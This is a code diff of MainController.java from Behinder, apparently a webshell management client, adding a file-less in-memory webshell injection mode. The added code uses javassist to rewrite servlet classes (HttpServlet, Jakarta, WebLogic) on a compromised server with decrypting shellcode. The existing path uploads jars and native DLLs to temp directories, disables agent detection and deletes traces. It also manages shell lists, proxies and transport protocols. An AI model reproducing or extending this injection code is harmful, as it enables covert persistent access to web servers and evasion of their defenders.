@@ -1,6 +1,5 @@
 package net.rebeyond.behinder.ui.controller;
 
-import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.net.Authenticator;
@@ -13,6 +12,7 @@ import java.security.SecureRandom;
 import java.sql.Timestamp;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
@@ -20,6 +20,7 @@ import java.util.Map;
 import java.util.Optional;
 import java.util.Random;
 import java.util.regex.Pattern;
+import java.util.stream.Collectors;
 import javafx.application.Platform;
 import javafx.beans.property.SimpleStringProperty;
 import javafx.beans.property.StringProperty;
@@ -63,9 +64,18 @@ import javafx.scene.paint.Color;
 import javafx.stage.FileChooser;
 import javafx.stage.Stage;
 import javafx.stage.Window;
+import javassist.ByteArrayClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+import javassist.NotFoundException;
 import net.rebeyond.behinder.core.Constants;
+import net.rebeyond.behinder.core.ICrypt;
 import net.rebeyond.behinder.core.ShellService;
 import net.rebeyond.behinder.dao.ShellManager;
+import net.rebeyond.behinder.dao.TransProtocolDao;
+import net.rebeyond.behinder.entity.TransProtocol;
+import net.rebeyond.behinder.utils.OKHttpClientUtil;
 import net.rebeyond.behinder.utils.Utils;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -98,18 +108,25 @@ public class MainController {
    @FXML
    private Label importBtn;
    @FXML
+   private Label transProtocolBtn;
+   @FXML
    private TextField searchShellTxt;
    @FXML
    private Label statusLabel;
    @FXML
    private Label versionLabel;
    @FXML
+   private Label authorLabel;
+   @FXML
    private Label searchShellLabel;
    @FXML
    private Label proxyStatusLabel;
    @FXML
    private TreeView catagoryTreeView;
+   private ComboBox transProtocolCombo = new ComboBox();
    private ShellManager shellManager;
+   private TransProtocolDao transProtocolDao;
+   private Map targetClasses = new HashMap();
    public static Map currentProxy = new HashMap();
    private int COL_INDEX_URL = 0;
    private int COL_INDEX_IP = 1;
@@ -124,8 +141,8 @@ public class MainController {
    public MainController() {
       try {
          this.shellManager = new ShellManager();
+         this.transProtocolDao = new TransProtocolDao();
       } catch (Exception var2) {
-         System.err.println(var2.getMessage());
          this.showErrorMessage("错误", "数据库文件丢失");
          System.exit(0);
       }
@@ -138,14 +155,18 @@ public class MainController {
          this.initShellList();
          this.initToolbar();
          this.initBottomBar();
+         this.initMemshellTargetClassMap();
          this.loadProxy();
       } catch (Exception var2) {
+         var2.printStackTrace();
       }
 
    }
 
    private void initBottomBar() {
+      String TIP_FOR_VERSION = "保留版权是对原创基本的尊重：）";
       this.versionLabel.setText(String.format(this.versionLabel.getText(), Constants.VERSION));
+      this.authorLabel.setText(Constants.AUTHOR);
    }
 
    private void loadProxy() throws Exception {
@@ -160,7 +181,7 @@ public class MainController {
          currentProxy.put("username", username);
          currentProxy.put("password", password);
          InetSocketAddress proxyAddr = new InetSocketAddress(ip, Integer.parseInt(port));
-         Proxy proxy;
+         Proxy proxy = null;
          if (type.equals("HTTP")) {
             proxy = new Proxy(Type.HTTP, proxyAddr);
             currentProxy.put("proxy", proxy);
@@ -169,6 +190,8 @@ public class MainController {
             currentProxy.put("proxy", proxy);
          }
 
+         OKHttpClientUtil.setProxy(proxy);
+         this.proxyStatusLabel.getGraphic().setVisible(true);
          this.proxyStatusLabel.setText("代理生效中");
       }
 
@@ -197,12 +220,12 @@ public class MainController {
          enableRadio.setToggleGroup(statusGroup);
          disableRadio.setToggleGroup(statusGroup);
          HBox statusHbox = new HBox();
-         statusHbox.setSpacing(10.0D);
+         statusHbox.setSpacing(10.0);
          statusHbox.getChildren().add(enableRadio);
          statusHbox.getChildren().add(disableRadio);
          GridPane proxyGridPane = new GridPane();
-         proxyGridPane.setVgap(15.0D);
-         proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
+         proxyGridPane.setVgap(15.0);
+         proxyGridPane.setPadding(new Insets(20.0, 20.0, 0.0, 10.0));
          Label typeLabel = new Label("类型：");
          ComboBox typeCombo = new ComboBox();
          typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
@@ -252,6 +275,8 @@ public class MainController {
          saveBtn.setOnAction((e) -> {
             if (disableRadio.isSelected()) {
                currentProxy.put("proxy", (Object)null);
+               OKHttpClientUtil.setProxy((Proxy)null);
+               this.proxyStatusLabel.getGraphic().setVisible(false);
                this.proxyStatusLabel.setText("");
 
                try {
@@ -266,9 +291,10 @@ public class MainController {
                } catch (Exception var13) {
                }
 
+               final String type;
                if (!userNameText.getText().trim().equals("")) {
                   final String proxyUser = userNameText.getText().trim();
-                  String type = passwordText.getText();
+                  type = passwordText.getText();
                   Authenticator.setDefault(new Authenticator() {
                      public PasswordAuthentication getPasswordAuthentication() {
                         return new PasswordAuthentication(proxyUser, type.toCharArray());
@@ -281,16 +307,18 @@ public class MainController {
                currentProxy.put("username", userNameText.getText());
                currentProxy.put("password", passwordText.getText());
                InetSocketAddress proxyAddr = new InetSocketAddress(IPText.getText(), Integer.parseInt(PortText.getText()));
-               String type = typeCombo.getValue().toString();
-               Proxy proxy;
-               if (type.equals("HTTP")) {
+               String temptype = typeCombo.getValue().toString();
+               Proxy proxy = null;
+               if (temptype.equals("HTTP")) {
                   proxy = new Proxy(Type.HTTP, proxyAddr);
                   currentProxy.put("proxy", proxy);
-               } else if (type.equals("SOCKS")) {
+               } else if (temptype.equals("SOCKS")) {
                   proxy = new Proxy(Type.SOCKS, proxyAddr);
                   currentProxy.put("proxy", proxy);
                }
 
+               OKHttpClientUtil.setProxy(proxy);
+               this.proxyStatusLabel.getGraphic().setVisible(true);
                this.proxyStatusLabel.setText("代理生效中");
                inputDialog.getDialogPane().getScene().getWindow().hide();
             }
@@ -310,7 +338,7 @@ public class MainController {
          proxyGridPane.add(passwordLabel, 0, 5);
          proxyGridPane.add(passwordText, 1, 5);
          HBox buttonBox = new HBox();
-         buttonBox.setSpacing(20.0D);
+         buttonBox.setSpacing(20.0);
          buttonBox.setAlignment(Pos.CENTER);
          buttonBox.getChildren().add(cancelBtn);
          buttonBox.getChildren().add(saveBtn);
@@ -425,6 +453,23 @@ public class MainController {
          }
 
       });
+      this.transProtocolBtn.setOnMouseClicked((event) -> {
+         FXMLLoader loader = new FXMLLoader(this.getClass().getResource("/net/rebeyond/behinder/ui/TransProtocolPane.fxml"));
+
+         try {
+            Parent transProtocolPane = (Parent)loader.load();
+            TransProtocolPaneController transProtocolPaneController = (TransProtocolPaneController)loader.getController();
+            transProtocolPaneController.init();
+            Stage stage = new Stage();
+            stage.setTitle("传输协议配置");
+            stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
+            stage.setScene(new Scene(transProtocolPane));
+            stage.show();
+         } catch (Exception var6) {
+            var6.printStackTrace();
+         }
+
+      });
    }
 
    private boolean checkSingleAlive() {
@@ -449,81 +494,157 @@ public class MainController {
             shellService.doConnect();
             String osInfo = shellEntity.getString("os");
             int osType;
-            String libPath;
             if (osInfo == null || osInfo.equals("")) {
                osType = (new SecureRandom()).nextInt(3000);
-               libPath = Utils.getRandomString(osType);
-               JSONObject basicInfoObj = new JSONObject(shellService.getBasicInfo(libPath));
-               osInfo = (new String(Base64.decode(basicInfoObj.getString("osInfo")), "UTF-8")).toLowerCase();
+               String randString = Utils.getRandomString(osType);
+               JSONObject basicInfoObj = new JSONObject(shellService.getBasicInfo(randString));
+               osInfo = (new String(Base64.getDecoder().decode(basicInfoObj.getString("osInfo")), "UTF-8")).toLowerCase();
             }
 
             osType = Utils.getOSType(osInfo);
-            libPath = Utils.getRandomString(6);
-            if (osType == Constants.OS_TYPE_WINDOWS) {
-               libPath = "c:/windows/temp/" + libPath;
-            } else {
-               libPath = "/tmp/" + libPath;
+            if (type.equals("AgentNoFile")) {
+               this.injectAgentNoFile(shellService, path, isAntiAgent);
+            } else if (type.equals("Agent")) {
+               this.injectAgent(shellService, osType, path, isAntiAgent);
             }
 
-            shellService.uploadFile(libPath, Utils.getResourceData("net/rebeyond/behinder/resource/tools/tools_" + osType + ".jar"), true);
-            shellService.loadJar(libPath);
-            shellService.injectMemShell(type, libPath, path, Utils.getKey(shellEntity.getString("password")), isAntiAgent);
-
-            try {
-               String memUrl = Utils.getBaseUrl(shellEntity.getString("url")) + path;
-               shellEntity.put("url", (Object)memUrl);
-               int memType = this.getMemTypeFromType(type);
-               shellEntity.put("memType", memType);
-               this.addShell(shellEntity);
-               this.loadShellList();
-               this.shellListTable.getSelectionModel().select(this.shellListTable.getItems().size() - 1);
-               Platform.runLater(() -> {
-                  this.statusLabel.setText("注入完成。");
-               });
-               if (osType == Constants.OS_TYPE_WINDOWS) {
-                  try {
-                     JSONObject basicInfoMap = new JSONObject(shellService.getBasicInfo(Utils.getWhatever()));
-                     String arch = (new String(Base64.decode(basicInfoMap.getString("arch")), "UTF-8")).toLowerCase();
-                     String remoteUploadPath = "c:/windows/temp/" + Utils.getRandomString((new Random()).nextInt(10)) + ".log";
-                     byte[] nativeLibraryFileContent;
-                     if (arch.toString().indexOf("64") >= 0) {
-                        nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x64.dll");
-                        shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
-                        shellService.freeFile(remoteUploadPath, libPath);
-                        if (isAntiAgent) {
-                           shellService.antiAgent(remoteUploadPath);
-                        }
-
-                        shellService.deleteFile(remoteUploadPath);
-                     } else {
-                        nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x32.dll");
-                        shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
-                        shellService.freeFile(remoteUploadPath, libPath);
-                        if (isAntiAgent) {
-                           shellService.antiAgent(remoteUploadPath);
-                        }
-
-                        shellService.deleteFile(remoteUploadPath);
-                     }
-                  } catch (Exception var19) {
-                     var19.printStackTrace();
-                  }
-               }
-            } catch (Exception var20) {
-               Platform.runLater(() -> {
-                  this.statusLabel.setText("注入完成，但是shell入库失败：" + var20.getMessage());
-               });
-            }
-         } catch (Exception var21) {
-            var21.printStackTrace();
+            this.addMemShellRow(shellEntity, type, path);
+         } catch (Exception var11) {
+            var11.printStackTrace();
             Platform.runLater(() -> {
-               this.statusLabel.setText("注入失败：" + var21.getMessage());
+               this.statusLabel.setText("注入失败：" + var11.getMessage());
             });
          }
 
       };
       Thread worker = new Thread(runner);
       worker.start();
+   }
+
+   private void initMemshellTargetClassMap() {
+      Map targetClassJavaxMap = new HashMap();
+      targetClassJavaxMap.put("methodName", "service");
+      List paramJavaxClsStrList = new ArrayList();
+      paramJavaxClsStrList.add("javax.servlet.ServletRequest");
+      paramJavaxClsStrList.add("javax.servlet.ServletResponse");
+      targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
+      this.targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
+      Map targetClassJakartaMap = new HashMap();
+      targetClassJakartaMap.put("methodName", "service");
+      List paramJakartaClsStrList = new ArrayList();
+      paramJakartaClsStrList.add("jakarta.servlet.ServletRequest");
+      paramJakartaClsStrList.add("jakarta.servlet.ServletResponse");
+      targetClassJakartaMap.put("paramList", paramJakartaClsStrList);
+      this.targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
+      this.targetClasses.put("jakarta.servlet.http.HttpServlet", targetClassJakartaMap);
+      Map targetClassWeblogicMap = new HashMap();
+      targetClassWeblogicMap.put("methodName", "execute");
+      List paramWeblogicClsStrList = new ArrayList();
+      paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
+      paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
+      targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
+      this.targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);
+   }
+
+   private void injectAgentNoFile(ShellService shellService, String path, boolean isAntiAgent) throws Exception {
+      JSONObject responseObj = shellService.getMemShellTargetClass();
+      if (responseObj.getString("status").equals("success")) {
+         JSONObject msgObj = new JSONObject(responseObj.getString("msg"));
+         String className = msgObj.getString("className").replaceFirst("/", "").replace("/", ".").replace(".class", "");
+         String classBody = msgObj.getString("classBody");
+         byte[] targetClassByte = Base64.getDecoder().decode(classBody);
+         ClassPool cp = ClassPool.getDefault();
+         cp.insertClassPath(new ByteArrayClassPath(className, targetClassByte));
+         CtClass targetClass = cp.get(className);
+         Map targetClassMap = (Map)this.targetClasses.get(className);
+         String methodName = targetClassMap.get("methodName").toString();
+         List paramList = (List)targetClassMap.get("paramList");
+         List paramClasses = (List)paramList.stream().map((c) -> {
+            CtClass ctClass = null;
+
+            try {
+               ctClass = cp.get(c.toString());
+            } catch (NotFoundException var4) {
+               var4.printStackTrace();
+            }
+
+            return ctClass;
+         }).collect(Collectors.toList());
+         CtMethod ctMethod = targetClass.getDeclaredMethod(methodName, (CtClass[])paramClasses.toArray(new CtClass[paramClasses.size()]));
+         ICrypt cryptor = shellService.getCryptor();
+         ctMethod.insertBefore(String.format(Constants.shellCodeWithDecrypt, path, Base64.getEncoder().encodeToString(cryptor.getDecodeClsBytes()), "Decrypt"));
+         targetClass.detach();
+         byte[] hackedClass = targetClass.toBytecode();
+         JSONObject resObj = shellService.injectAgentNoFileMemShell(className, Base64.getEncoder().encodeToString(hackedClass), isAntiAgent);
+         System.out.println(resObj);
+      }
+
+   }
+
+   private void injectAgent(ShellService shellService, int osType, String path, boolean isAntiAgent) throws Exception {
+      String libPath = Utils.getRandomString(6);
+      if (osType == Constants.OS_TYPE_WINDOWS) {
+         libPath = "c:/windows/temp/" + libPath;
+      } else {
+         libPath = "/tmp/" + libPath;
+      }
+
+      shellService.uploadFile(libPath, Utils.getResourceData("net/rebeyond/behinder/resource/tools/tools_" + osType + ".jar"), true);
+      shellService.loadJar(libPath);
+      shellService.injectAgentMemShell(libPath, path, Utils.getKey("rebeyond"), isAntiAgent);
+      if (osType == Constants.OS_TYPE_WINDOWS) {
+         try {
+            JSONObject basicInfoMap = new JSONObject(shellService.getBasicInfo(Utils.getWhatever()).getString("msg"));
+            String arch = (new String(Base64.getDecoder().decode(basicInfoMap.getString("arch")), "UTF-8")).toLowerCase();
+            String remoteUploadPath = "c:/windows/temp/" + Utils.getRandomString((new Random()).nextInt(10)) + ".log";
+            byte[] nativeLibraryFileContent;
+            if (arch.toString().indexOf("64") >= 0) {
+               nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x64.dll");
+               shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
+               shellService.freeFile(remoteUploadPath, libPath);
+               if (isAntiAgent) {
+                  shellService.antiAgent(remoteUploadPath);
+               }
+
+               shellService.deleteFile(remoteUploadPath);
+            } else {
+               nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x32.dll");
+               shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
+               shellService.freeFile(remoteUploadPath, libPath);
+               if (isAntiAgent) {
+                  shellService.antiAgent(remoteUploadPath);
+               }
+
+               shellService.deleteFile(remoteUploadPath);
+            }
+         } catch (Exception var12) {
+            var12.printStackTrace();
+         }
+      }
+
+   }
+
+   private void addMemShellRow(JSONObject shellEntity, String type, String path) {
+      try {
+         String memUrl = Utils.getBaseUrl(shellEntity.getString("url")) + path;
+         shellEntity.put("url", memUrl);
+         int memType = this.getMemTypeFromType(type);
+         shellEntity.put("memType", memType);
+         this.addShell(shellEntity);
+         this.loadShellList();
+         this.shellListTable.getSelectionModel().select(this.shellListTable.getItems().size() - 1);
+         Platform.runLater(() -> {
+            this.statusLabel.setText("注入完成。");
+         });
+      } catch (Exception var6) {
+         Platform.runLater(() -> {
+            this.statusLabel.setText("注入完成，但是shell入库失败：" + var6.getMessage());
+         });
+      }
+
+   }
+
+   private void clearRemoteDll() {
    }
 
    private void initCatagoryList() throws Exception {
@@ -550,7 +671,7 @@ public class MainController {
       }
 
       this.idCol.setCellFactory((col) -> {
-         TableCell cell = new TableCell<Object,String>() {
+         TableCell cell = new TableCell() {
             public void updateItem(String item, boolean empty) {
                super.updateItem(item, empty);
                this.setText((String)null);
@@ -566,7 +687,7 @@ public class MainController {
          return cell;
       });
       this.statusCol.setCellFactory((col) -> {
-         TableCell cell = new TableCell<Object,String>() {
+         TableCell cell = new TableCell() {
             public void updateItem(String item, boolean empty) {
                super.updateItem(item, empty);
                if (empty) {
@@ -615,8 +736,9 @@ public class MainController {
                String shellID = ((StringProperty)((List)row.getItem()).get(this.COL_INDEX_ID)).getValue();
 
                try {
-                  this.openShell(url, shellID);
+                  this.openShell(url, shellID, false);
                } catch (Exception var6) {
+                  var6.printStackTrace();
                   this.statusLabel.setText("shell打开失败。");
                }
             }
@@ -648,6 +770,15 @@ public class MainController {
       }
    }
 
+   private boolean checkTransProtocolId(ComboBox transProtocolCombo) {
+      if (transProtocolCombo.getUserData() != null && transProtocolCombo.getValue() != null) {
+         return true;
+      } else {
+         this.showErrorMessage("错误", "传输协议不能为空");
+         return false;
+      }
+   }
+
    private void showShellDialog(int shellID) throws Exception {
       Alert alert = new Alert(AlertType.NONE);
       alert.setResizable(true);
@@ -664,6 +795,34 @@ public class MainController {
       ComboBox shellType = new ComboBox();
       ObservableList typeList = FXCollections.observableArrayList(new String[]{"jsp", "php", "aspx", "asp"});
       shellType.setItems(typeList);
+      shellType.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
+         try {
+            List transProtocolList = this.transProtocolDao.findTransProtocolByType(newValue.toString());
+            this.transProtocolCombo.getItems().clear();
+            Iterator var5 = transProtocolList.iterator();
+
+            while(var5.hasNext()) {
+               TransProtocol transProtocol = (TransProtocol)var5.next();
+               this.transProtocolCombo.getItems().add(transProtocol.getName());
+            }
+         } catch (Exception var7) {
+            var7.printStackTrace();
+         }
+
+      });
+      this.transProtocolCombo.getSelectionModel().selectedItemProperty().addListener((opt, oldValue, newValue) -> {
+         if (newValue != null) {
+            try {
+               TransProtocol transProtocol = this.transProtocolDao.findTransProtocolByNameAndType(newValue.toString(), shellType.getValue().toString());
+               this.transProtocolCombo.setUserData(transProtocol.getId());
+            } catch (Exception var6) {
+               var6.printStackTrace();
+            }
+
+         }
+      });
+      shellType.setOnAction((event) -> {
+      });
       ComboBox shellCatagory = new ComboBox();
 
       try {
@@ -677,12 +836,16 @@ public class MainController {
 
          shellCatagory.setItems(catagoryList);
          shellCatagory.getSelectionModel().select(0);
-      } catch (Exception var17) {
-         var17.printStackTrace();
+      } catch (Exception var18) {
+         var18.printStackTrace();
       }
 
       TextArea header = new TextArea();
-      TextArea commnet = new TextArea();
+      header.setPromptText("请输入自定义请求头Key:value对，一行一个，如：User-Agent: Just_For_Fun");
+      header.setPrefHeight(100.0);
+      TextArea comment = new TextArea();
+      comment.setPromptText("请输入备注信息");
+      comment.setPrefHeight(50.0);
       urlText.textProperty().addListener((observable, oldValue, newValue) -> {
          URL url;
          try {
@@ -704,23 +867,23 @@ public class MainController {
       saveBtn.setDefaultButton(true);
       Button cancelBtn = new Button("取消");
       GridPane vpsInfoPane = new GridPane();
-      GridPane.setMargin(vpsInfoPane, new Insets(20.0D, 0.0D, 0.0D, 0.0D));
-      vpsInfoPane.setVgap(10.0D);
+      GridPane.setMargin(vpsInfoPane, new Insets(20.0, 0.0, 0.0, 0.0));
+      vpsInfoPane.setVgap(10.0);
       vpsInfoPane.setMaxWidth(Double.MAX_VALUE);
       vpsInfoPane.add(new Label("URL："), 0, 0);
       vpsInfoPane.add(urlText, 1, 0);
-      vpsInfoPane.add(new Label("密码："), 0, 1);
-      vpsInfoPane.add(passText, 1, 1);
-      vpsInfoPane.add(new Label("脚本类型："), 0, 2);
-      vpsInfoPane.add(shellType, 1, 2);
+      vpsInfoPane.add(new Label("脚本类型："), 0, 1);
+      vpsInfoPane.add(shellType, 1, 1);
+      vpsInfoPane.add(new Label("传输协议："), 0, 2);
+      vpsInfoPane.add(this.transProtocolCombo, 1, 2);
       vpsInfoPane.add(new Label("分类："), 0, 3);
       vpsInfoPane.add(shellCatagory, 1, 3);
       vpsInfoPane.add(new Label("自定义请求头："), 0, 4);
       vpsInfoPane.add(header, 1, 4);
       vpsInfoPane.add(new Label("备注："), 0, 5);
-      vpsInfoPane.add(commnet, 1, 5);
+      vpsInfoPane.add(comment, 1, 5);
       HBox buttonBox = new HBox();
-      buttonBox.setSpacing(20.0D);
+      buttonBox.setSpacing(20.0);
       buttonBox.getChildren().addAll(new Node[]{cancelBtn, saveBtn});
       buttonBox.setAlignment(Pos.BOTTOM_CENTER);
       vpsInfoPane.add(buttonBox, 0, 8);
@@ -728,21 +891,24 @@ public class MainController {
       alert.getDialogPane().setContent(vpsInfoPane);
       if (shellID != -1) {
          JSONObject shellObj = this.shellManager.findShell(shellID);
+         TransProtocol transProtocol = this.transProtocolDao.findTransProtocolById(shellObj.getInt("transProtocolId"));
          urlText.setText(shellObj.getString("url"));
          passText.setText(shellObj.getString("password"));
          shellType.setValue(shellObj.getString("type"));
+         this.transProtocolCombo.getSelectionModel().select(transProtocol.getName());
          shellCatagory.setValue(shellObj.getString("catagory"));
          header.setText(shellObj.getString("headers"));
-         commnet.setText(shellObj.getString("comment"));
+         comment.setText(shellObj.getString("comment"));
       }
 
       saveBtn.setOnAction((e) -> {
          String url = urlText.getText().trim();
          String password = passText.getText();
-         if (this.checkUrl(url) && this.checkPassword(password)) {
+         int transProtocolId = (Integer)this.transProtocolCombo.getUserData();
+         if (this.checkUrl(url) && this.checkTransProtocolId(this.transProtocolCombo)) {
             String type = shellType.getValue().toString();
             String catagory = shellCatagory.getValue().toString();
-            String comment = commnet.getText();
+            String commentStr = comment.getText();
             String headers = header.getText();
             String os = "";
             int status = Constants.SHELL_STATUS_ALIVE;
@@ -750,15 +916,15 @@ public class MainController {
 
             try {
                if (shellID == -1) {
-                  this.shellManager.addShell(url, password, type, catagory, os, comment, headers, status, memType);
+                  this.shellManager.addShell(url, transProtocolId, type, catagory, os, commentStr, headers, status, memType);
                } else {
-                  this.shellManager.updateShell(shellID, url, password, type, catagory, comment, headers);
+                  this.shellManager.updateShell(shellID, url, transProtocolId, type, catagory, commentStr, headers);
                }
 
                this.loadShellList();
                return;
-            } catch (Exception var23) {
-               this.showErrorMessage("保存失败", var23.getMessage());
+            } catch (Exception var24) {
+               this.showErrorMessage("保存失败", var24.getMessage());
             } finally {
                alert.getDialogPane().getScene().getWindow().hide();
             }
@@ -771,11 +937,11 @@ public class MainController {
       alert.showAndWait();
    }
 
-   private void openShell(String url, String shellID) throws Exception {
+   private void openShell(String url, String shellID, boolean offline) throws Exception {
       FXMLLoader loader = new FXMLLoader(this.getClass().getResource("/net/rebeyond/behinder/ui/MainWindow.fxml"));
       Parent mainWindow = (Parent)loader.load();
       MainWindowController mainWindowController = (MainWindowController)loader.getController();
-      mainWindowController.init(this.shellManager.findShell(Integer.parseInt(shellID)), this.shellManager, currentProxy);
+      mainWindowController.init(this.shellManager.findShell(Integer.parseInt(shellID)), this.shellManager, currentProxy, offline);
       Stage stage = new Stage();
       stage.setTitle(url);
       stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
@@ -784,20 +950,21 @@ public class MainController {
       stage.setOnCloseRequest((e) -> {
          Runnable runner = () -> {
             List workerList = mainWindowController.getWorkList();
-            Iterator var2 = workerList.iterator();
+            Iterator var3 = workerList.iterator();
 
-            while(var2.hasNext()) {
-               Thread worker = (Thread)var2.next();
+            while(var3.hasNext()) {
+               Thread worker = (Thread)var3.next();
 
                while(worker.isAlive()) {
                   try {
                      worker.stop();
-                  } catch (Exception var5) {
-                  } catch (Error var6) {
+                  } catch (Exception var6) {
+                  } catch (Error var7) {
                   }
                }
             }
 
+            OKHttpClientUtil.clearSession(url);
             workerList.clear();
          };
          Thread worker = new Thread(runner);
@@ -810,6 +977,8 @@ public class MainController {
       ContextMenu cm = new ContextMenu();
       MenuItem openBtn = new MenuItem("打开");
       cm.getItems().add(openBtn);
+      MenuItem openOfflineBtn = new MenuItem("打开(离线模式)");
+      cm.getItems().add(openOfflineBtn);
       MenuItem addBtn = new MenuItem("新增");
       cm.getItems().add(addBtn);
       MenuItem editBtn = new MenuItem("编辑");
@@ -830,10 +999,22 @@ public class MainController {
          String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
 
          try {
-            this.openShell(url, shellID);
+            this.openShell(url, shellID, false);
          } catch (Exception var5) {
-            this.statusLabel.setText("shell打开失败。");
             var5.printStackTrace();
+            this.statusLabel.setText("shell打开失败。");
+         }
+
+      });
+      openOfflineBtn.setOnAction((event) -> {
+         String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
+         String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
+
+         try {
+            this.openShell(url, shellID, true);
+         } catch (Exception var5) {
+            var5.printStackTrace();
+            this.statusLabel.setText("shell打开失败。");
          }
 
       });
@@ -847,9 +1028,6 @@ public class MainController {
 
       });
       editBtn.setOnAction((event) -> {
-         if(this.shellListTable.getSelectionModel().getSelectedItem()==null){
-            return;
-         }
          String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
 
          try {
@@ -900,7 +1078,7 @@ public class MainController {
             Utils.showErrorMessage("提示", "内存马植入目前仅支持Java");
          } else {
             Alert inputDialog = new Alert(AlertType.NONE);
-            inputDialog.setWidth(300.0D);
+            inputDialog.setWidth(300.0);
             inputDialog.setResizable(true);
             inputDialog.setTitle("注入内存马");
             Window window = inputDialog.getDialogPane().getScene().getWindow();
@@ -908,11 +1086,11 @@ public class MainController {
                window.hide();
             });
             GridPane injectGridPane = new GridPane();
-            injectGridPane.setVgap(15.0D);
-            injectGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
+            injectGridPane.setVgap(15.0);
+            injectGridPane.setPadding(new Insets(20.0, 20.0, 0.0, 10.0));
             Label typeLabel = new Label("注入类型：");
             ComboBox typeCombo = new ComboBox();
-            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"Agent"}));
+            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"AgentNoFile", "Agent"}));
             typeCombo.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
                if (!newValue.equals("Filter") && newValue.equals("Servlet")) {
                }
@@ -922,7 +1100,7 @@ public class MainController {
             Label pathLabel = new Label("注入路径：");
             pathLabel.setAlignment(Pos.CENTER_RIGHT);
             TextField pathText = new TextField();
-            pathText.setPrefWidth(300.0D);
+            pathText.setPrefWidth(300.0);
             pathText.setPromptText(String.format("支持正则表达式，如%smemshell.*", Utils.getContextPath(url)));
             pathText.focusedProperty().addListener((obs, oldVal, newVal) -> {
                if (pathText.getText().equals("")) {
@@ -952,7 +1130,7 @@ public class MainController {
             injectGridPane.add(antiAgentCheckBox, 0, 2);
             injectGridPane.add(antiAgentMemo, 0, 3, 2, 1);
             HBox buttonBox = new HBox();
-            buttonBox.setSpacing(20.0D);
+            buttonBox.setSpacing(20.0);
             buttonBox.setAlignment(Pos.CENTER);
             buttonBox.getChildren().add(cancelBtn);
             buttonBox.getChildren().add(saveBtn);
@@ -975,6 +1153,8 @@ public class MainController {
    private int getMemTypeFromType(String type) {
       if (type.equals("Agent")) {
          return Constants.MEMSHELL_TYPE_AGENT;
+      } else if (type.equals("AgentNoFile")) {
+         return Constants.MEMSHELL_TYPE_AGENT;
       } else if (type.equals("Filter")) {
          return Constants.MEMSHELL_TYPE_FILTER;
       } else {
@@ -992,7 +1172,8 @@ public class MainController {
       String headers = Utils.getOrDefault(shellEntity, "headers", String.class);
       int status = Integer.parseInt(Utils.getOrDefault(shellEntity, "status", Integer.TYPE));
       int memType = Integer.parseInt(Utils.getOrDefault(shellEntity, "memType", Integer.TYPE));
-      this.shellManager.addShell(url, password, type, catagory, os, comment, headers, status, memType);
+      int transProtocolId = Integer.parseInt(Utils.getOrDefault(shellEntity, "transProtocolId", Integer.TYPE));
+      this.shellManager.addShell(url, transProtocolId, type, catagory, os, comment, headers, status, memType);
    }
 
    private void loadShellList() throws Exception {
@@ -1076,7 +1257,7 @@ public class MainController {
          panel.add(cataGoryNameTxt, 1, 0);
          panel.add(cataGoryCommentLable, 0, 1);
          panel.add(cataGoryCommentTxt, 1, 1);
-         panel.setVgap(20.0D);
+         panel.setVgap(20.0);
          alert.getDialogPane().setContent(panel);
          Optional result = alert.showAndWait();
          if (result.get() == ButtonType.OK) {
@@ -1169,7 +1350,7 @@ public class MainController {
                JSONObject shellEntity = shells.getJSONObject(i);
 
                try {
-                  final int finalCount = count;
+                  int finalCount = count;
                   Platform.runLater(() -> {
                      this.statusLabel.setText(String.format("正在导入%d/%d...", finalCount, shells.length()));
                   });
@@ -1182,11 +1363,11 @@ public class MainController {
                }
             }
 
-            final int finalDuplicateCount = duplicateCount;
-            final int finalCount = count;
+            int finalduplicateCount = duplicateCount;
+            int finalcount = count;
             Platform.runLater(() -> {
                this.statusLabel.setText("导入完成。");
-               Utils.showInfoMessage("提示", String.format("导入完成，共有%d条数据，%d条数据已存在，新导入%d数据，", shells.length(), finalDuplicateCount, finalCount));
+               Utils.showInfoMessage("提示", String.format("导入完成，共有%d条数据，%d条数据已存在，新导入%d数据，", shells.length(), finalduplicateCount, finalcount));
 
                try {
                   this.loadShellList();
